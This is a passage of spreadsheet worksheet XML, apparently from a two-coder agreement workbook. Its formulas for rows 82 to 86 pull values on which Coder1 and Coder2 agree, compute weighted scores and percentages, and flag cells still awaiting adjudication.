        <f>IF(AND(Coder1!E82&amp;""&lt;&gt;"",Coder1!E82&amp;""=Coder2!E82&amp;""),Coder1!E82,"")</f>
        <v/>
      </c>
      <c r="F82" s="14">
        <f>IF(AND(Coder1!F82&amp;""&lt;&gt;"",Coder1!F82&amp;""=Coder2!F82&amp;""),Coder1!F82,"")</f>
        <v/>
      </c>
      <c r="G82" s="14">
        <f>IF(AND(Coder1!G82&amp;""&lt;&gt;"",Coder1!G82&amp;""=Coder2!G82&amp;""),Coder1!G82,"")</f>
        <v/>
      </c>
      <c r="H82" s="14">
        <f>IF(AND(Coder1!H82&amp;""&lt;&gt;"",Coder1!H82&amp;""=Coder2!H82&amp;""),Coder1!H82,"")</f>
        <v/>
      </c>
      <c r="I82" s="14">
        <f>IF(AND(Coder1!I82&amp;""&lt;&gt;"",Coder1!I82&amp;""=Coder2!I82&amp;""),Coder1!I82,"")</f>
        <v/>
      </c>
      <c r="J82" s="14">
        <f>IF(AND(Coder1!J82&amp;""&lt;&gt;"",Coder1!J82&amp;""=Coder2!J82&amp;""),Coder1!J82,"")</f>
        <v/>
      </c>
      <c r="K82" s="14">
        <f>IF(AND(Coder1!K82&amp;""&lt;&gt;"",Coder1!K82&amp;""=Coder2!K82&amp;""),Coder1!K82,"")</f>
        <v/>
      </c>
      <c r="L82" s="14">
        <f>IF(AND(Coder1!L82&amp;""&lt;&gt;"",Coder1!L82&amp;""=Coder2!L82&amp;""),Coder1!L82,"")</f>
        <v/>
      </c>
      <c r="M82" s="14">
        <f>IF(AND(Coder1!M82&amp;""&lt;&gt;"",Coder1!M82&amp;""=Coder2!M82&amp;""),Coder1!M82,"")</f>
        <v/>
      </c>
      <c r="N82" s="14">
        <f>IF(AND(Coder1!N82&amp;""&lt;&gt;"",Coder1!N82&amp;""=Coder2!N82&amp;""),Coder1!N82,"")</f>
        <v/>
      </c>
      <c r="O82" s="14">
        <f>IF(AND(Coder1!O82&amp;""&lt;&gt;"",Coder1!O82&amp;""=Coder2!O82&amp;""),Coder1!O82,"")</f>
        <v/>
      </c>
      <c r="P82" s="14">
        <f>IF(AND(Coder1!P82&amp;""&lt;&gt;"",Coder1!P82&amp;""=Coder2!P82&amp;""),Coder1!P82,"")</f>
        <v/>
      </c>
      <c r="Q82" s="14">
        <f>IF(AND(Coder1!Q82&amp;""&lt;&gt;"",Coder1!Q82&amp;""=Coder2!Q82&amp;""),Coder1!Q82,"")</f>
        <v/>
      </c>
      <c r="R82" s="14">
        <f>IF(AND(Coder1!R82&amp;""&lt;&gt;"",Coder1!R82&amp;""=Coder2!R82&amp;""),Coder1!R82,"")</f>
        <v/>
      </c>
      <c r="S82" s="14">
        <f>IF(AND(Coder1!S82&amp;""&lt;&gt;"",Coder1!S82&amp;""=Coder2!S82&amp;""),Coder1!S82,"")</f>
        <v/>
      </c>
      <c r="T82" s="14">
        <f>IF(AND(Coder1!T82&amp;""&lt;&gt;"",Coder1!T82&amp;""=Coder2!T82&amp;""),Coder1!T82,"")</f>
        <v/>
      </c>
      <c r="U82" s="14">
        <f>IF(AND(Coder1!U82&amp;""&lt;&gt;"",Coder1!U82&amp;""=Coder2!U82&amp;""),Coder1!U82,"")</f>
        <v/>
      </c>
      <c r="V82" s="14">
        <f>IF(AND(Coder1!V82&amp;""&lt;&gt;"",Coder1!V82&amp;""=Coder2!V82&amp;""),Coder1!V82,"")</f>
        <v/>
      </c>
      <c r="W82" s="14">
        <f>IF(AND(Coder1!W82&amp;""&lt;&gt;"",Coder1!W82&amp;""=Coder2!W82&amp;""),Coder1!W82,"")</f>
        <v/>
      </c>
      <c r="X82" s="14">
        <f>IF(AND(Coder1!X82&amp;""&lt;&gt;"",Coder1!X82&amp;""=Coder2!X82&amp;""),Coder1!X82,"")</f>
        <v/>
      </c>
      <c r="Y82" s="14">
        <f>IF(AND(Coder1!Y82&amp;""&lt;&gt;"",Coder1!Y82&amp;""=Coder2!Y82&amp;""),Coder1!Y82,"")</f>
        <v/>
      </c>
      <c r="Z82" s="14">
        <f>IF(AND(Coder1!Z82&amp;""&lt;&gt;"",Coder1!Z82&amp;""=Coder2!Z82&amp;""),Coder1!Z82,"")</f>
        <v/>
      </c>
      <c r="AA82" s="14">
        <f>IF(AND(Coder1!AA82&amp;""&lt;&gt;"",Coder1!AA82&amp;""=Coder2!AA82&amp;""),Coder1!AA82,"")</f>
        <v/>
      </c>
      <c r="AB82" s="14">
        <f>IF(AND(Coder1!AB82&amp;""&lt;&gt;"",Coder1!AB82&amp;""=Coder2!AB82&amp;""),Coder1!AB82,"")</f>
        <v/>
      </c>
      <c r="AC82" s="14">
        <f>IF(AND(Coder1!AC82&amp;""&lt;&gt;"",Coder1!AC82&amp;""=Coder2!AC82&amp;""),Coder1!AC82,"")</f>
        <v/>
      </c>
      <c r="AD82" s="14">
        <f>IF(AND(Coder1!AD82&amp;""&lt;&gt;"",Coder1!AD82&amp;""=Coder2!AD82&amp;""),Coder1!AD82,"")</f>
        <v/>
      </c>
      <c r="AE82" s="14">
        <f>IF(AND(Coder1!AE82&amp;""&lt;&gt;"",Coder1!AE82&amp;""=Coder2!AE82&amp;""),Coder1!AE82,"")</f>
        <v/>
      </c>
      <c r="AF82" s="14">
        <f>IF(AND(Coder1!AF82&amp;""&lt;&gt;"",Coder1!AF82&amp;""=Coder2!AF82&amp;""),Coder1!AF82,"")</f>
        <v/>
      </c>
      <c r="AG82" s="14">
        <f>IF(AND(Coder1!AG82&amp;""&lt;&gt;"",Coder1!AG82&amp;""=Coder2!AG82&amp;""),Coder1!AG82,"")</f>
        <v/>
      </c>
      <c r="AH82" s="14">
        <f>IF(AND(Coder1!AH82&amp;""&lt;&gt;"",Coder1!AH82&amp;""=Coder2!AH82&amp;""),Coder1!AH82,"")</f>
        <v/>
      </c>
      <c r="AI82" s="11">
        <f>IF(COUNT(E82:L82)=0,"",SUM(E82:L82))</f>
        <v/>
      </c>
      <c r="AJ82" s="11">
        <f>IF(AI82="","",N(E82)*3+N(F82)*2+N(G82)*2+N(H82)*2+N(I82)*2+N(J82)*3+N(K82)*3+N(L82)*3)</f>
        <v/>
      </c>
      <c r="AK82" s="11">
        <f>IF(AI82="","",COUNTIF(N82:AG82,1))</f>
        <v/>
      </c>
      <c r="AL82" s="11">
        <f>IF(OR(AJ82="",AJ82=0),"",ROUND(100*(AJ82-AK82)/AJ82,1))</f>
        <v/>
      </c>
      <c r="AM82" s="11">
        <f>IF(AND(Coder1!AN82=1,Coder2!AN82=1),IF(COUNTBLANK(E82:AH82)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN82" s="11">
        <f>IF(AND(Coder1!AN82=1,Coder2!AN82=1),IF(SUMPRODUCT(--(Coder1!E82:AH82&amp;""&lt;&gt;Coder2!E82:AH82&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO82" s="11" t="n"/>
    </row>
    <row r="83">
      <c r="A83" s="11">
        <f>Coder1!A83</f>
        <v/>
      </c>
      <c r="B83" s="11">
        <f>Coder1!B83</f>
        <v/>
      </c>
      <c r="C83" s="11">
        <f>Coder1!C83</f>
        <v/>
      </c>
      <c r="D83" s="11">
        <f>Coder1!D83</f>
        <v/>
      </c>
      <c r="E83" s="14">
        <f>IF(AND(Coder1!E83&amp;""&lt;&gt;"",Coder1!E83&amp;""=Coder2!E83&amp;""),Coder1!E83,"")</f>
        <v/>
      </c>
      <c r="F83" s="14">
        <f>IF(AND(Coder1!F83&amp;""&lt;&gt;"",Coder1!F83&amp;""=Coder2!F83&amp;""),Coder1!F83,"")</f>
        <v/>
      </c>
      <c r="G83" s="14">
        <f>IF(AND(Coder1!G83&amp;""&lt;&gt;"",Coder1!G83&amp;""=Coder2!G83&amp;""),Coder1!G83,"")</f>
        <v/>
      </c>
      <c r="H83" s="14">
        <f>IF(AND(Coder1!H83&amp;""&lt;&gt;"",Coder1!H83&amp;""=Coder2!H83&amp;""),Coder1!H83,"")</f>
        <v/>
      </c>
      <c r="I83" s="14">
        <f>IF(AND(Coder1!I83&amp;""&lt;&gt;"",Coder1!I83&amp;""=Coder2!I83&amp;""),Coder1!I83,"")</f>
        <v/>
      </c>
      <c r="J83" s="14">
        <f>IF(AND(Coder1!J83&amp;""&lt;&gt;"",Coder1!J83&amp;""=Coder2!J83&amp;""),Coder1!J83,"")</f>
        <v/>
      </c>
      <c r="K83" s="14">
        <f>IF(AND(Coder1!K83&amp;""&lt;&gt;"",Coder1!K83&amp;""=Coder2!K83&amp;""),Coder1!K83,"")</f>
        <v/>
      </c>
      <c r="L83" s="14">
        <f>IF(AND(Coder1!L83&amp;""&lt;&gt;"",Coder1!L83&amp;""=Coder2!L83&amp;""),Coder1!L83,"")</f>
        <v/>
      </c>
      <c r="M83" s="14">
        <f>IF(AND(Coder1!M83&amp;""&lt;&gt;"",Coder1!M83&amp;""=Coder2!M83&amp;""),Coder1!M83,"")</f>
        <v/>
      </c>
      <c r="N83" s="14">
        <f>IF(AND(Coder1!N83&amp;""&lt;&gt;"",Coder1!N83&amp;""=Coder2!N83&amp;""),Coder1!N83,"")</f>
        <v/>
      </c>
      <c r="O83" s="14">
        <f>IF(AND(Coder1!O83&amp;""&lt;&gt;"",Coder1!O83&amp;""=Coder2!O83&amp;""),Coder1!O83,"")</f>
        <v/>
      </c>
      <c r="P83" s="14">
        <f>IF(AND(Coder1!P83&amp;""&lt;&gt;"",Coder1!P83&amp;""=Coder2!P83&amp;""),Coder1!P83,"")</f>
        <v/>
      </c>
      <c r="Q83" s="14">
        <f>IF(AND(Coder1!Q83&amp;""&lt;&gt;"",Coder1!Q83&amp;""=Coder2!Q83&amp;""),Coder1!Q83,"")</f>
        <v/>
      </c>
      <c r="R83" s="14">
        <f>IF(AND(Coder1!R83&amp;""&lt;&gt;"",Coder1!R83&amp;""=Coder2!R83&amp;""),Coder1!R83,"")</f>
        <v/>
      </c>
      <c r="S83" s="14">
        <f>IF(AND(Coder1!S83&amp;""&lt;&gt;"",Coder1!S83&amp;""=Coder2!S83&amp;""),Coder1!S83,"")</f>
        <v/>
      </c>
      <c r="T83" s="14">
        <f>IF(AND(Coder1!T83&amp;""&lt;&gt;"",Coder1!T83&amp;""=Coder2!T83&amp;""),Coder1!T83,"")</f>
        <v/>
      </c>
      <c r="U83" s="14">
        <f>IF(AND(Coder1!U83&amp;""&lt;&gt;"",Coder1!U83&amp;""=Coder2!U83&amp;""),Coder1!U83,"")</f>
        <v/>
      </c>
      <c r="V83" s="14">
        <f>IF(AND(Coder1!V83&amp;""&lt;&gt;"",Coder1!V83&amp;""=Coder2!V83&amp;""),Coder1!V83,"")</f>
        <v/>
      </c>
      <c r="W83" s="14">
        <f>IF(AND(Coder1!W83&amp;""&lt;&gt;"",Coder1!W83&amp;""=Coder2!W83&amp;""),Coder1!W83,"")</f>
        <v/>
      </c>
      <c r="X83" s="14">
        <f>IF(AND(Coder1!X83&amp;""&lt;&gt;"",Coder1!X83&amp;""=Coder2!X83&amp;""),Coder1!X83,"")</f>
        <v/>
      </c>
      <c r="Y83" s="14">
        <f>IF(AND(Coder1!Y83&amp;""&lt;&gt;"",Coder1!Y83&amp;""=Coder2!Y83&amp;""),Coder1!Y83,"")</f>
        <v/>
      </c>
      <c r="Z83" s="14">
        <f>IF(AND(Coder1!Z83&amp;""&lt;&gt;"",Coder1!Z83&amp;""=Coder2!Z83&amp;""),Coder1!Z83,"")</f>
        <v/>
      </c>
      <c r="AA83" s="14">
        <f>IF(AND(Coder1!AA83&amp;""&lt;&gt;"",Coder1!AA83&amp;""=Coder2!AA83&amp;""),Coder1!AA83,"")</f>
        <v/>
      </c>
      <c r="AB83" s="14">
        <f>IF(AND(Coder1!AB83&amp;""&lt;&gt;"",Coder1!AB83&amp;""=Coder2!AB83&amp;""),Coder1!AB83,"")</f>
        <v/>
      </c>
      <c r="AC83" s="14">
        <f>IF(AND(Coder1!AC83&amp;""&lt;&gt;"",Coder1!AC83&amp;""=Coder2!AC83&amp;""),Coder1!AC83,"")</f>
        <v/>
      </c>
      <c r="AD83" s="14">
        <f>IF(AND(Coder1!AD83&amp;""&lt;&gt;"",Coder1!AD83&amp;""=Coder2!AD83&amp;""),Coder1!AD83,"")</f>
        <v/>
      </c>
      <c r="AE83" s="14">
        <f>IF(AND(Coder1!AE83&amp;""&lt;&gt;"",Coder1!AE83&amp;""=Coder2!AE83&amp;""),Coder1!AE83,"")</f>
        <v/>
      </c>
      <c r="AF83" s="14">
        <f>IF(AND(Coder1!AF83&amp;""&lt;&gt;"",Coder1!AF83&amp;""=Coder2!AF83&amp;""),Coder1!AF83,"")</f>
        <v/>
      </c>
      <c r="AG83" s="14">
        <f>IF(AND(Coder1!AG83&amp;""&lt;&gt;"",Coder1!AG83&amp;""=Coder2!AG83&amp;""),Coder1!AG83,"")</f>
        <v/>
      </c>
      <c r="AH83" s="14">
        <f>IF(AND(Coder1!AH83&amp;""&lt;&gt;"",Coder1!AH83&amp;""=Coder2!AH83&amp;""),Coder1!AH83,"")</f>
        <v/>
      </c>
      <c r="AI83" s="11">
        <f>IF(COUNT(E83:L83)=0,"",SUM(E83:L83))</f>
        <v/>
      </c>
      <c r="AJ83" s="11">
        <f>IF(AI83="","",N(E83)*3+N(F83)*2+N(G83)*2+N(H83)*2+N(I83)*2+N(J83)*3+N(K83)*3+N(L83)*3)</f>
        <v/>
      </c>
      <c r="AK83" s="11">
        <f>IF(AI83="","",COUNTIF(N83:AG83,1))</f>
        <v/>
      </c>
      <c r="AL83" s="11">
        <f>IF(OR(AJ83="",AJ83=0),"",ROUND(100*(AJ83-AK83)/AJ83,1))</f>
        <v/>
      </c>
      <c r="AM83" s="11">
        <f>IF(AND(Coder1!AN83=1,Coder2!AN83=1),IF(COUNTBLANK(E83:AH83)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN83" s="11">
        <f>IF(AND(Coder1!AN83=1,Coder2!AN83=1),IF(SUMPRODUCT(--(Coder1!E83:AH83&amp;""&lt;&gt;Coder2!E83:AH83&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO83" s="11" t="n"/>
    </row>
    <row r="84">
      <c r="A84" s="11">
        <f>Coder1!A84</f>
        <v/>
      </c>
      <c r="B84" s="11">
        <f>Coder1!B84</f>
        <v/>
      </c>
      <c r="C84" s="11">
        <f>Coder1!C84</f>
        <v/>
      </c>
      <c r="D84" s="11">
        <f>Coder1!D84</f>
        <v/>
      </c>
      <c r="E84" s="14">
        <f>IF(AND(Coder1!E84&amp;""&lt;&gt;"",Coder1!E84&amp;""=Coder2!E84&amp;""),Coder1!E84,"")</f>
        <v/>
      </c>
      <c r="F84" s="14">
        <f>IF(AND(Coder1!F84&amp;""&lt;&gt;"",Coder1!F84&amp;""=Coder2!F84&amp;""),Coder1!F84,"")</f>
        <v/>
      </c>
      <c r="G84" s="14">
        <f>IF(AND(Coder1!G84&amp;""&lt;&gt;"",Coder1!G84&amp;""=Coder2!G84&amp;""),Coder1!G84,"")</f>
        <v/>
      </c>
      <c r="H84" s="14">
        <f>IF(AND(Coder1!H84&amp;""&lt;&gt;"",Coder1!H84&amp;""=Coder2!H84&amp;""),Coder1!H84,"")</f>
        <v/>
      </c>
      <c r="I84" s="14">
        <f>IF(AND(Coder1!I84&amp;""&lt;&gt;"",Coder1!I84&amp;""=Coder2!I84&amp;""),Coder1!I84,"")</f>
        <v/>
      </c>
      <c r="J84" s="14">
        <f>IF(AND(Coder1!J84&amp;""&lt;&gt;"",Coder1!J84&amp;""=Coder2!J84&amp;""),Coder1!J84,"")</f>
        <v/>
      </c>
      <c r="K84" s="14">
        <f>IF(AND(Coder1!K84&amp;""&lt;&gt;"",Coder1!K84&amp;""=Coder2!K84&amp;""),Coder1!K84,"")</f>
        <v/>
      </c>
      <c r="L84" s="14">
        <f>IF(AND(Coder1!L84&amp;""&lt;&gt;"",Coder1!L84&amp;""=Coder2!L84&amp;""),Coder1!L84,"")</f>
        <v/>
      </c>
      <c r="M84" s="14">
        <f>IF(AND(Coder1!M84&amp;""&lt;&gt;"",Coder1!M84&amp;""=Coder2!M84&amp;""),Coder1!M84,"")</f>
        <v/>
      </c>
      <c r="N84" s="14">
        <f>IF(AND(Coder1!N84&amp;""&lt;&gt;"",Coder1!N84&amp;""=Coder2!N84&amp;""),Coder1!N84,"")</f>
        <v/>
      </c>
      <c r="O84" s="14">
        <f>IF(AND(Coder1!O84&amp;""&lt;&gt;"",Coder1!O84&amp;""=Coder2!O84&amp;""),Coder1!O84,"")</f>
        <v/>
      </c>
      <c r="P84" s="14">
        <f>IF(AND(Coder1!P84&amp;""&lt;&gt;"",Coder1!P84&amp;""=Coder2!P84&amp;""),Coder1!P84,"")</f>
        <v/>
      </c>
      <c r="Q84" s="14">
        <f>IF(AND(Coder1!Q84&amp;""&lt;&gt;"",Coder1!Q84&amp;""=Coder2!Q84&amp;""),Coder1!Q84,"")</f>
        <v/>
      </c>
      <c r="R84" s="14">
        <f>IF(AND(Coder1!R84&amp;""&lt;&gt;"",Coder1!R84&amp;""=Coder2!R84&amp;""),Coder1!R84,"")</f>
        <v/>
      </c>
      <c r="S84" s="14">
        <f>IF(AND(Coder1!S84&amp;""&lt;&gt;"",Coder1!S84&amp;""=Coder2!S84&amp;""),Coder1!S84,"")</f>
        <v/>
      </c>
      <c r="T84" s="14">
        <f>IF(AND(Coder1!T84&amp;""&lt;&gt;"",Coder1!T84&amp;""=Coder2!T84&amp;""),Coder1!T84,"")</f>
        <v/>
      </c>
      <c r="U84" s="14">
        <f>IF(AND(Coder1!U84&amp;""&lt;&gt;"",Coder1!U84&amp;""=Coder2!U84&amp;""),Coder1!U84,"")</f>
        <v/>
      </c>
      <c r="V84" s="14">
        <f>IF(AND(Coder1!V84&amp;""&lt;&gt;"",Coder1!V84&amp;""=Coder2!V84&amp;""),Coder1!V84,"")</f>
        <v/>
      </c>
      <c r="W84" s="14">
        <f>IF(AND(Coder1!W84&amp;""&lt;&gt;"",Coder1!W84&amp;""=Coder2!W84&amp;""),Coder1!W84,"")</f>
        <v/>
      </c>
      <c r="X84" s="14">
        <f>IF(AND(Coder1!X84&amp;""&lt;&gt;"",Coder1!X84&amp;""=Coder2!X84&amp;""),Coder1!X84,"")</f>
        <v/>
      </c>
      <c r="Y84" s="14">
        <f>IF(AND(Coder1!Y84&amp;""&lt;&gt;"",Coder1!Y84&amp;""=Coder2!Y84&amp;""),Coder1!Y84,"")</f>
        <v/>
      </c>
      <c r="Z84" s="14">
        <f>IF(AND(Coder1!Z84&amp;""&lt;&gt;"",Coder1!Z84&amp;""=Coder2!Z84&amp;""),Coder1!Z84,"")</f>
        <v/>
      </c>
      <c r="AA84" s="14">
        <f>IF(AND(Coder1!AA84&amp;""&lt;&gt;"",Coder1!AA84&amp;""=Coder2!AA84&amp;""),Coder1!AA84,"")</f>
        <v/>
      </c>
      <c r="AB84" s="14">
        <f>IF(AND(Coder1!AB84&amp;""&lt;&gt;"",Coder1!AB84&amp;""=Coder2!AB84&amp;""),Coder1!AB84,"")</f>
        <v/>
      </c>
      <c r="AC84" s="14">
        <f>IF(AND(Coder1!AC84&amp;""&lt;&gt;"",Coder1!AC84&amp;""=Coder2!AC84&amp;""),Coder1!AC84,"")</f>
        <v/>
      </c>
      <c r="AD84" s="14">
        <f>IF(AND(Coder1!AD84&amp;""&lt;&gt;"",Coder1!AD84&amp;""=Coder2!AD84&amp;""),Coder1!AD84,"")</f>
        <v/>
      </c>
      <c r="AE84" s="14">
        <f>IF(AND(Coder1!AE84&amp;""&lt;&gt;"",Coder1!AE84&amp;""=Coder2!AE84&amp;""),Coder1!AE84,"")</f>
        <v/>
      </c>
      <c r="AF84" s="14">
        <f>IF(AND(Coder1!AF84&amp;""&lt;&gt;"",Coder1!AF84&amp;""=Coder2!AF84&amp;""),Coder1!AF84,"")</f>
        <v/>
      </c>
      <c r="AG84" s="14">
        <f>IF(AND(Coder1!AG84&amp;""&lt;&gt;"",Coder1!AG84&amp;""=Coder2!AG84&amp;""),Coder1!AG84,"")</f>
        <v/>
      </c>
      <c r="AH84" s="14">
        <f>IF(AND(Coder1!AH84&amp;""&lt;&gt;"",Coder1!AH84&amp;""=Coder2!AH84&amp;""),Coder1!AH84,"")</f>
        <v/>
      </c>
      <c r="AI84" s="11">
        <f>IF(COUNT(E84:L84)=0,"",SUM(E84:L84))</f>
        <v/>
      </c>
      <c r="AJ84" s="11">
        <f>IF(AI84="","",N(E84)*3+N(F84)*2+N(G84)*2+N(H84)*2+N(I84)*2+N(J84)*3+N(K84)*3+N(L84)*3)</f>
        <v/>
      </c>
      <c r="AK84" s="11">
        <f>IF(AI84="","",COUNTIF(N84:AG84,1))</f>
        <v/>
      </c>
      <c r="AL84" s="11">
        <f>IF(OR(AJ84="",AJ84=0),"",ROUND(100*(AJ84-AK84)/AJ84,1))</f>
        <v/>
      </c>
      <c r="AM84" s="11">
        <f>IF(AND(Coder1!AN84=1,Coder2!AN84=1),IF(COUNTBLANK(E84:AH84)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN84" s="11">
        <f>IF(AND(Coder1!AN84=1,Coder2!AN84=1),IF(SUMPRODUCT(--(Coder1!E84:AH84&amp;""&lt;&gt;Coder2!E84:AH84&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO84" s="11" t="n"/>
    </row>
    <row r="85">
      <c r="A85" s="11">
        <f>Coder1!A85</f>
        <v/>
      </c>
      <c r="B85" s="11">
        <f>Coder1!B85</f>
        <v/>
      </c>
      <c r="C85" s="11">
        <f>Coder1!C85</f>
        <v/>
      </c>
      <c r="D85" s="11">
        <f>Coder1!D85</f>
        <v/>
      </c>
      <c r="E85" s="14">
        <f>IF(AND(Coder1!E85&amp;""&lt;&gt;"",Coder1!E85&amp;""=Coder2!E85&amp;""),Coder1!E85,"")</f>
        <v/>
      </c>
      <c r="F85" s="14">
        <f>IF(AND(Coder1!F85&amp;""&lt;&gt;"",Coder1!F85&amp;""=Coder2!F85&amp;""),Coder1!F85,"")</f>
        <v/>
      </c>
      <c r="G85" s="14">
        <f>IF(AND(Coder1!G85&amp;""&lt;&gt;"",Coder1!G85&amp;""=Coder2!G85&amp;""),Coder1!G85,"")</f>
        <v/>
      </c>
      <c r="H85" s="14">
        <f>IF(AND(Coder1!H85&amp;""&lt;&gt;"",Coder1!H85&amp;""=Coder2!H85&amp;""),Coder1!H85,"")</f>
        <v/>
      </c>
      <c r="I85" s="14">
        <f>IF(AND(Coder1!I85&amp;""&lt;&gt;"",Coder1!I85&amp;""=Coder2!I85&amp;""),Coder1!I85,"")</f>
        <v/>
      </c>
      <c r="J85" s="14">
        <f>IF(AND(Coder1!J85&amp;""&lt;&gt;"",Coder1!J85&amp;""=Coder2!J85&amp;""),Coder1!J85,"")</f>
        <v/>
      </c>
      <c r="K85" s="14">
        <f>IF(AND(Coder1!K85&amp;""&lt;&gt;"",Coder1!K85&amp;""=Coder2!K85&amp;""),Coder1!K85,"")</f>
        <v/>
      </c>
      <c r="L85" s="14">
        <f>IF(AND(Coder1!L85&amp;""&lt;&gt;"",Coder1!L85&amp;""=Coder2!L85&amp;""),Coder1!L85,"")</f>
        <v/>
      </c>
      <c r="M85" s="14">
        <f>IF(AND(Coder1!M85&amp;""&lt;&gt;"",Coder1!M85&amp;""=Coder2!M85&amp;""),Coder1!M85,"")</f>
        <v/>
      </c>
      <c r="N85" s="14">
        <f>IF(AND(Coder1!N85&amp;""&lt;&gt;"",Coder1!N85&amp;""=Coder2!N85&amp;""),Coder1!N85,"")</f>
        <v/>
      </c>
      <c r="O85" s="14">
        <f>IF(AND(Coder1!O85&amp;""&lt;&gt;"",Coder1!O85&amp;""=Coder2!O85&amp;""),Coder1!O85,"")</f>
        <v/>
      </c>
      <c r="P85" s="14">
        <f>IF(AND(Coder1!P85&amp;""&lt;&gt;"",Coder1!P85&amp;""=Coder2!P85&amp;""),Coder1!P85,"")</f>
        <v/>
      </c>
      <c r="Q85" s="14">
        <f>IF(AND(Coder1!Q85&amp;""&lt;&gt;"",Coder1!Q85&amp;""=Coder2!Q85&amp;""),Coder1!Q85,"")</f>
        <v/>
      </c>
      <c r="R85" s="14">
        <f>IF(AND(Coder1!R85&amp;""&lt;&gt;"",Coder1!R85&amp;""=Coder2!R85&amp;""),Coder1!R85,"")</f>
        <v/>
      </c>
      <c r="S85" s="14">
        <f>IF(AND(Coder1!S85&amp;""&lt;&gt;"",Coder1!S85&amp;""=Coder2!S85&amp;""),Coder1!S85,"")</f>
        <v/>
      </c>
      <c r="T85" s="14">
        <f>IF(AND(Coder1!T85&amp;""&lt;&gt;"",Coder1!T85&amp;""=Coder2!T85&amp;""),Coder1!T85,"")</f>
        <v/>
      </c>
      <c r="U85" s="14">
        <f>IF(AND(Coder1!U85&amp;""&lt;&gt;"",Coder1!U85&amp;""=Coder2!U85&amp;""),Coder1!U85,"")</f>
        <v/>
      </c>
      <c r="V85" s="14">
        <f>IF(AND(Coder1!V85&amp;""&lt;&gt;"",Coder1!V85&amp;""=Coder2!V85&amp;""),Coder1!V85,"")</f>
        <v/>
      </c>
      <c r="W85" s="14">
        <f>IF(AND(Coder1!W85&amp;""&lt;&gt;"",Coder1!W85&amp;""=Coder2!W85&amp;""),Coder1!W85,"")</f>
        <v/>
      </c>
      <c r="X85" s="14">
        <f>IF(AND(Coder1!X85&amp;""&lt;&gt;"",Coder1!X85&amp;""=Coder2!X85&amp;""),Coder1!X85,"")</f>
        <v/>
      </c>
      <c r="Y85" s="14">
        <f>IF(AND(Coder1!Y85&amp;""&lt;&gt;"",Coder1!Y85&amp;""=Coder2!Y85&amp;""),Coder1!Y85,"")</f>
        <v/>
      </c>
      <c r="Z85" s="14">
        <f>IF(AND(Coder1!Z85&amp;""&lt;&gt;"",Coder1!Z85&amp;""=Coder2!Z85&amp;""),Coder1!Z85,"")</f>
        <v/>
      </c>
      <c r="AA85" s="14">
        <f>IF(AND(Coder1!AA85&amp;""&lt;&gt;"",Coder1!AA85&amp;""=Coder2!AA85&amp;""),Coder1!AA85,"")</f>
        <v/>
      </c>
      <c r="AB85" s="14">
        <f>IF(AND(Coder1!AB85&amp;""&lt;&gt;"",Coder1!AB85&amp;""=Coder2!AB85&amp;""),Coder1!AB85,"")</f>
        <v/>
      </c>
      <c r="AC85" s="14">
        <f>IF(AND(Coder1!AC85&amp;""&lt;&gt;"",Coder1!AC85&amp;""=Coder2!AC85&amp;""),Coder1!AC85,"")</f>
        <v/>
      </c>
      <c r="AD85" s="14">
        <f>IF(AND(Coder1!AD85&amp;""&lt;&gt;"",Coder1!AD85&amp;""=Coder2!AD85&amp;""),Coder1!AD85,"")</f>
        <v/>
      </c>
      <c r="AE85" s="14">
        <f>IF(AND(Coder1!AE85&amp;""&lt;&gt;"",Coder1!AE85&amp;""=Coder2!AE85&amp;""),Coder1!AE85,"")</f>
        <v/>
      </c>
      <c r="AF85" s="14">
        <f>IF(AND(Coder1!AF85&amp;""&lt;&gt;"",Coder1!AF85&amp;""=Coder2!AF85&amp;""),Coder1!AF85,"")</f>
        <v/>
      </c>
      <c r="AG85" s="14">
        <f>IF(AND(Coder1!AG85&amp;""&lt;&gt;"",Coder1!AG85&amp;""=Coder2!AG85&amp;""),Coder1!AG85,"")</f>
        <v/>
      </c>
      <c r="AH85" s="14">
        <f>IF(AND(Coder1!AH85&amp;""&lt;&gt;"",Coder1!AH85&amp;""=Coder2!AH85&amp;""),Coder1!AH85,"")</f>
        <v/>
      </c>
      <c r="AI85" s="11">
        <f>IF(COUNT(E85:L85)=0,"",SUM(E85:L85))</f>
        <v/>
      </c>
      <c r="AJ85" s="11">
        <f>IF(AI85="","",N(E85)*3+N(F85)*2+N(G85)*2+N(H85)*2+N(I85)*2+N(J85)*3+N(K85)*3+N(L85)*3)</f>
        <v/>
      </c>
      <c r="AK85" s="11">
        <f>IF(AI85="","",COUNTIF(N85:AG85,1))</f>
        <v/>
      </c>
      <c r="AL85" s="11">
        <f>IF(OR(AJ85="",AJ85=0),"",ROUND(100*(AJ85-AK85)/AJ85,1))</f>
        <v/>
      </c>
      <c r="AM85" s="11">
        <f>IF(AND(Coder1!AN85=1,Coder2!AN85=1),IF(COUNTBLANK(E85:AH85)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN85" s="11">
        <f>IF(AND(Coder1!AN85=1,Coder2!AN85=1),IF(SUMPRODUCT(--(Coder1!E85:AH85&amp;""&lt;&gt;Coder2!E85:AH85&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO85" s="11" t="n"/>
    </row>
    <row r="86">
      <c r="A86" s="11">
        <f>Coder1!A86</f>
        <v/>
      </c>
      <c r="B86" s="11">
        <f>Coder1!B86</f>
        <v/>
      </c>
      <c r="C86" s="11">
        <f>Coder1!C86</f>
        <v/>
      </c>
      <c r="D86" s="11">
        <f>Coder1!D86</f>
        <v/>
      </c>
      <c r="E86" s="14">
        <f>IF(AND(Coder1!E86&amp;""&lt;&gt;"",Coder1!E86&amp;""=Coder2!E86&amp;""),Coder1!E86,"")</f>
        <v/>
      </c>
      <c r="F86" s="14">
        <f>IF(AND(Coder1!F86&amp;""&lt;&gt;"",Coder1!F86&amp;""=Coder2!F86&amp;""),Coder1!F86,"")</f>
        <v/>
      </c>
      <c r="G86" s="14">
        <f>IF(AND(Coder1!G86&amp;""&lt;&gt;"",Coder1!G86&amp;""=Coder2!G86&amp;""),Coder1!G86,"")</f>
        <v/>
      </c>
      <c r="H86" s="14">
